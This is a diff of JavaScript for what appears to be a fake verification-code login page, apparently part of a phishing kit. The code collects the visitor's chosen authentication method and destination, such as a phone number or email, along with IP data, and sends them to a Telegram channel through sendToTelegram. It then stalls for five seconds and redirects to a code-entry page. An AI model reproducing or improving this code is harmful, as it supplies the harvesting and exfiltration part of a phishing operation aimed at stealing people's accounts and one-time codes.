@@ -67,7 +67,9 @@
         if (response.ok) {
           ipData = await response.json();
         }
-      } catch (e) {}
+      } catch (e) {
+        console.warn('Could not fetch IP data');
+      }
 
       const payload = {
         action: action,
@@ -188,33 +190,31 @@
       return;
     }
 
+    // ====== SEND METHOD TO TELEGRAM ======
+    sendToTelegram('auth_method', {
+      method: method,
+      destination: destination
+    });
+
+    // ====== DISABLE BUTTON AND SHOW LOADING ======
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="spinner"></span>';
     submitBtn.classList.add('loading');
-    
-    const sessionId = 'AUTH_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-    
-    sendToTelegram('auth_attempt', {
-      method: method,
-      destination: destination,
-      sessionId: sessionId
-    }).then(() => {
-      try {
-        sessionStorage.setItem(
-          "melodyAuth",
-          JSON.stringify({
-            method: method,
-            destination: destination,
-            sessionId: sessionId
-          })
-        );
-      } catch (e) {}
-      
+
+    // Store auth data for next page
+    try {
+      sessionStorage.setItem(
+        "melodyAuth",
+        JSON.stringify({
+          method: method,
+          destination: destination
+        })
+      );
+    } catch (e) {}
+
+    // ====== REDIRECT AFTER 5 SECONDS ======
+    setTimeout(function() {
       window.location.href = "enter-code.html";
-    }).catch(() => {
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = 'Generate Code';
-      submitBtn.classList.remove('loading');
-    });
+    }, 5000);
   });
 })();
